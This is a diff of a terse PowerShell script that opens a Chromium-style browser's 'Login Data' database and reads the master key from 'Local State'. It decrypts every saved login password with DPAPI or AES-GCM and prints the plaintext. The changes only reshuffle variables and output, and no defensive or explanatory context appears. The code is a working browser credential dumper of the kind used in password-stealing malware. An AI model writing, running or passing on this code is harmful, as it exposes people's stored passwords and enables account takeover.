@@ -12,11 +12,12 @@ Add-Type "using System.Runtime.InteropServices;using p=System.IntPtr;$p class W{
 $s=[W]::O("$z\\Default\\Login Data",[ref]$d)
 if((get-host).Version.Major -eq 7){$b=(gc "$z\\Local State"|ConvertFrom-Json).os_crypt.encrypted_key
 $x=[Security.Cryptography.AesGcm]::New($u::Unprotect([System.Convert]::FromBase64String($b)[5..($b.length-1)],$n,0))}$_=[W]::P($d,"SELECT*FROM logins WHERE blacklisted_by_user=0",-1,[ref]$s,0)
-for(;!([W]::S($s)%100)){$a=[W]::T($s,0)
-$b=[W]::T($s,3)
+for(;!([W]::S($s)%100)){[W]::T($s,0)
+[W]::T($s,3)
 $c=[W]::B($s,5)
-try{$a,$b,(($u::Unprotect($c,$n,0)|%{[char]$_})-join'')
-continue}catch{}if($x -ne $null){$t=$c[15..($c.length-17)]
+try{(($u::Unprotect($c,$n,0)|%{[char]$_})-join'')
+continue}catch{}if($x -ne $n){$k=$c.length
+$t=$c[15..($k-17)]
 $e=[byte[]]::new($t.length)
-$x.Decrypt($c[3..14],$t,$c[($c.length-16)..($c.length-1)],$e)
-$a,$b,(($e|%{[char]$_})-join'')}}
+$x.Decrypt($c[3..14],$t,$c[($k-16)..($k-1)],$e)
+($e|%{[char]$_})-join''}}
